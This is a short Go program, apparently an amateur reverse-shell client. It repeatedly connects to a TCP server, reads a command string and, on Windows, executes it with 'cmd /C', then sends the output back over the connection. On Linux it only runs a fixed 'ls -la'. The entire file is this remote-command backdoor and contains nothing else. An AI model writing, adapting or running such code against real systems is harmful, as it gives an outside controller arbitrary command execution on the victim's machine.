package main

import (
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"strconv"
)

func main() {

	var r int

	var j int
	_ = j

	_ = r
	r = 1
	j = 1
	// Connect to the server
	for {
		conn, err := net.Dial("tcp", "0.0.0.0:80")
		if err != nil {
			fmt.Println(err)
			return
		}

		// Send some data to the server

		//add
		//os.Chdir("./cmds")
		if r == j {
			buf := make([]byte, r) //一回目　8
			print(r)
			//fmt.Println(r)
			_, err = conn.Read(buf)

			r, _ = strconv.Atoi(string(buf))
			fmt.Println(string(buf))
			if err != nil {
				fmt.Println(err)
				return
			}

		}
		if r >= j {

			buf := make([]byte, r)
			_, err = conn.Read(buf)
			fmt.Println("korekaranozidai")
			fmt.Println(string(buf))

			switch runtime.GOOS {
			case "windows":
				//fmt.Printf(string(buf))
				out, err := exec.Command("cmd", "/C", string(buf)).Output()
				if err != nil {
					fmt.Println(err.Error())
					continue
				}
				fmt.Println(string(out))
				_, err = conn.Write([]byte(string(out)))
			case "linux":
				out, err := exec.Command("ls", "-la").Output()
				if err != nil {
					fmt.Println(err.Error())
					continue
				}
				fmt.Println(string(out))
				_, err = conn.Write([]byte(string(out)))
			}
			r = 1

		}
		fmt.Println(r)
		conn.Close()

	}

}
